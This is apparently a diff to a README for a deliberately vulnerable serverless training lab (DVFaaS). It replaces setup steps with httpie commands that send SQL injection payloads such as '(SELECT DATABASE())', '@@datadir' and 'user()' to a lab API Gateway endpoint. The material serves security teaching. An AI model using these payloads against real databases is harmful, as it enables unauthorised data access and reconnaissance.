@@ -6,9 +6,12 @@ The SQLi can be triggered by tampering with the "reading" from the "sensor", you
 
 You can leverage mysql functions, global variables, etc for the attack
 
-* Run `cd /root/DVFaaS-Damn-Vulnerable-Functions-as-a-Service/`
-* Run `pipenv shell`
-* Run `cd /root/DVFaaS-Damn-Vulnerable-Functions-as-a-Service/injection/mqtt_rds_sql_event_injection`
-* Run `python payload_generator.py <your_name> 358174707935`
+* Run `http GET https://f20ymqtwal.execute-api.us-east-1.amazonaws.com/api/test_insert`
+* Run `http POST https://f20ymqtwal.execute-api.us-east-1.amazonaws.com/api/publish/testesh reading="(SELECT DATABASE())"`
 
-These will send SNS messages with the SQL Injection payloads, which our vulnerable function will read, process and insert into the Database. Wait for instructor to show you how it works
+Substitute `(SELECT DATABASE())` with `(SELECT @@datadir), (SELECT user()), (SELECT CURRENT_USER())`
+
+* Run `cd /root/DVFaaS-Damn-Vulnerable-Functions-as-a-Service/injection/mqtt_rds_sql_event_injection`
+* Run `cat app.py`
+
+Let's look at the code
